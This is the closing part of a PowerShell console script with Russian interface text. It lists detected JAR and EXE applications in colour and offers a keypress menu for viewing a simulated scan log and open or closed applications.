        $isJar = $app.Name -match "\.jar$"
        if ($isJar) {
            $color = $CLR_JAR
            $typeLabel = "JAR"
        } else {
            $color = $CLR_TEXT_DIM
            $typeLabel = "EXE"
        }
        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
        Write-Host $app.Name -NoNewline -ForegroundColor $color
        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
        Write-Host ""
        Write-Host "    $($app.Path)" -ForegroundColor $CLR_TEXT_DIM
    }
}

# ---------- Запуск имитации ----------
Run-ScanSimulation

# Меню
while ($true) {
    Write-Host ""
    Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые приложения  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
    switch ($key) {
        '1' { Print-Header 1; Write-ColorLine "`n  Лог сканирования выведен выше. Прокрутите консоль вверх." -Color $CLR_TEXT_DIM }
        '2' { Show-Tab2 }
        '3' { Show-Tab3 }
        'q' { break }
        'Q' { break }
        default { continue }
    }
}
